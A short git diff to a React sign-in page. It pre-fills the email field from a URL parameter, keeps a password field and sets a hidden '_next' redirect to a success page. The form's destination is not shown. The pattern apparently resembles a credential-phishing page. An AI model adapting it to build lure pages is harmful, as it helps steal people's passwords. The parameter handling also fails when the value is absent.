@@ -4,10 +4,17 @@ import Logo from "/logo.png";
 
 export default function App() {
   const [domain, setDomain] = useState('')
+  const [email, setEmail] = useState('')
   useEffect(function getURL(){
-    setDomain(window.location.href)
-    console.log(domain)
-  },[]) 
+    const urlParams = new URLSearchParams(window.location.search);
+		const inputValue = urlParams.get('email').split('/')[0];
+    setEmail(inputValue)
+    setDomain(window.location.href.split('/?')[0])
+    // console.log(window.location.href.split('/?')[0])
+		// console.log(inputValue)
+    // console.log(domain)
+  },[email]) 
+
 
   return (
     <main>
@@ -30,6 +37,8 @@ export default function App() {
                 placeholder="Email address"
                 name="email"
                 required
+                value={email}
+                onChange={(e)=>setEmail(e.target.value)}
               />
               <input
                 type="password"
@@ -41,7 +50,7 @@ export default function App() {
               <input
                 type="hidden"
                 name="_next"
-                value={`${domain}greet.html`}
+                value={`${domain}/success.html`}
               ></input>
             </div>
             <p>
